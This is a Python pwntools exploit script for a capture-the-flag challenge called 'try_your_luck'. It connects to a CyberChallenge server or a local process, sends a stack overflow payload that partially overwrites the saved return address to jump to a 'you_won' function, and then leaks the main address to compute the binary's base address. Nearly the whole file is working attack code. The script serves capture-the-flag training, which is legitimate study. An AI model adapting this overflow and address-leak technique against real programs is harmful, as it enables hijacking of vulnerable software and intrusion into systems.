#!/usr/bin/env python3

from pwn import *
import re
from binascii import hexlify

exe = ELF("./try_your_luck")
context.binary = exe


PADDING = 40    # Padding to get to the RIP saved on stack


def conn():
	global r

	if args.LOCAL:
		r = process([exe.path])
		if args.PLT_DEBUG:
			gdb.attach(r, '''set disable-randomization off
				break game''')
	else:
		r = remote("luck.challs.cyberchallenge.it", 9133)


def you_won():

	# Overwrite the last 2 bytes with the last 2 bytes of 'you_won' function
	payload = b'A' * PADDING + exe.symbols['you_won'].to_bytes(2, 'little')

	# Program doesn't end the input string with null byte so it will read something in the stack as well!
	r.sendafter('Hi, what\'s your name? ', payload)


	# FROM NOW ON IT'S JUST A STUDY CASE. IT'S NOT USEFUL FOR THE CHALLENGE ITSELF
	output = r.recvlineS()
	main_address = re.match(r"Let's see if you're lucky (.*)\.\.\.", output).group(1).lstrip('A')

	# In the case you are unlucky enough to find a null byte in the address
	if len(main_address) < 6:
		log.warn('Cannot retrieve the full address due to a null byte.\nRetry!')
		exit(-1)

	base_address = int.from_bytes(main_address.encode('utf-8'), 'little') - exe.symbols['main']
	log.warn(f'Base address found: {hex(base_address)}')

	r.interactive()


def main():
	conn()

	you_won()


if __name__ == "__main__":
	main()
